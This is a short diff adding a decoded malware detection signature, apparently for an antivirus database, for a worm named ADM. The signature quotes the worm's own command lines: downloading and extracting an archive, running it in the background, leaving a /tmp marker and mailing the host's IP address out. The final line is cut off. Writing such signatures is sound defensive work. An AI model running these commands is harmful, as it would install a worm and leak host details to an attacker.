@@ -1,0 +1,12 @@
+VIRUS NAME: Win.Worm.ADM-4
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+w0rm0r
+get ADMw0rm.tgz
+bye
+tar xfvz ADMw0rm.tgz
+touch /tmp/w0rmishere
+nohup ./ADMw0rm &
+./gimmeIP | /bin/mail $EMAIL
+nohup /tmp/.w0rm -c "/bin/sleep 60
